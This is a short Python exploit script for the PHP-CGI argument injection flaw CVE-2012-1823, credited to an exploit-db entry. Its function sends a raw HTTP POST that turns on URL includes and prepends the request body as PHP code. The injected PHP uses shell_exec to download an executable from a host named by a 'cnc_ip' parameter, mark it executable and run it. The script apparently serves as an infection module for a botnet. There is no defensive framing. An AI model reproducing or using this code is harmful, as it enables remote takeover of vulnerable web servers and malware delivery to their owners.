# CVE-2012-1823 PHP CGI Argument Injection Exploit
# reference & credit: https://www.exploit-db.com/exploits/18836

import socket


def cgi_exploit(HOST, PORT,cnc_ip,executable):
		php_rce = """<?php shell_exec("curl http://%s/%s > file; chmod 777 %s; ./%s");?>"""%(cnc_ip,executable,executable,executable)
		post_Length = len(php_rce)
		http_raw="""POST /?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-Length: %s

%s
""" %(HOST , post_Length ,php_rce)
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(5)
			sock.connect((HOST, int(PORT)))
			sock.send(http_raw.encode())
			sock.close()
			return True
		except:
			return False
